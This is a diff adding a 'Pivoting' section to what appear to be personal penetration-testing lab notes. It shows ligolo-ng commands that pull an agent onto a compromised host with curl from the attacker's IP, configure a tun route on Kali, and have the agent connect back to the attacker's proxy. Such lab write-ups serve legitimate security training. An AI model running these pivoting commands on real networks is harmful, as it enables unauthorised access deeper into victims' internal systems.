@@ -68,5 +68,45 @@ So we have connection to .100 and .150 but i have scanned both and only .150 ret
 ![[Pasted image 20240806201736.png]]
 
 ## Pivoting
+So i decided to go this tool and will master it through practice. (i.e. upload the agent on the target device)
+Download agent and proxy
+https://github.com/nicocha30/ligolo-ng/releases/tag/v0.4.3
+```
+tar -xvzf ligolo-ng_agent_0.4.3_Linux_64bit.tar.gz
+```
 
-So i decided to go this tool and will master it through practice.
+```
+curl 10.50.88.33/agent -o agent
+```
+
+![[Pasted image 20240807132007.png]]
+
+
+Set the Interface in Kali 
+```
+sudo ip tuntap add user root mode tun ligolo
+```
+
+```
+sudo ip link set ligolo up
+```
+
+```
+sudo ip route add 10.200.87.0/24 dev ligolo
+```
+
+![[Pasted image 20240807133010.png]]
+
+
+Attacker
+```
+./proxy -selfcert 
+```
+![[Pasted image 20240807134145.png]]
+
+
+Compromised Asset
+```
+./agent -connect 10.5.88.33:11601 -ignore-cert
+```
+
